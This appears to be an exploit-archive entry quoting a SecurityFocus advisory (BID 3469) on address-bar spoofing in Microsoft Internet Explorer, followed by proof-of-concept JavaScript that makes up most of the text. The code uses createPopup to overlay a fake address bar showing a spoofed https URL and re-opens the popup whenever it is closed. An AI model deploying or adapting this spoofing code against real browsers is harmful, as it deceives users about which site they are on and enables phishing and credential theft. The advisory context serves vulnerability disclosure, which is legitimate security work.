@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/3469/info
+
+It is reported that Microsoft Internet Explorer may permit aspects of the Internet Explorer interface to be spoofed. This could facilitate numerous attacks against users of the browser, including spoofing of both graphical components of the underlying operating system and overlaying browser components.
+
+This misrepresentation may fool a user into taking dangerous actions. Users could then take further actions that compromise sensitive information based on this false sense of trust. 
+
+var vuln_x, vuln_y, vuln_w, vuln_h;
+function vuln_calc() {
+var root= document[
+(document.compatMode=='CSS1Compat') ?
+'documentElement' : 'body'
+];
+vuln_x= window.screenLeft+72;
+vuln_y= window.screenTop-20;
+vuln_w= root.offsetWidth-520;
+vuln_h= 17;
+vuln_show();
+}
+
+var vuln_win;
+function vuln_pop() {
+vuln_win= window.createPopup();
+vuln_win.document.body.innerHTML= vuln_html;
+vuln_win.document.body.style.margin= 0;
+vuln_win.document.body.onunload= vuln_pop;
+vuln_show();
+}
+
+function vuln_show() {
+if (vuln_win)
+vuln_win.show(vuln_x, vuln_y, vuln_w, vuln_h);
+}
+
+var vuln_html= '\x3Cdiv style="height: 100%; line-height: 17px;
+font-family: \'Tahoma\', sans-serif; font-size:
+8pt;">https://<spoofed URI>\x3C/div>' 
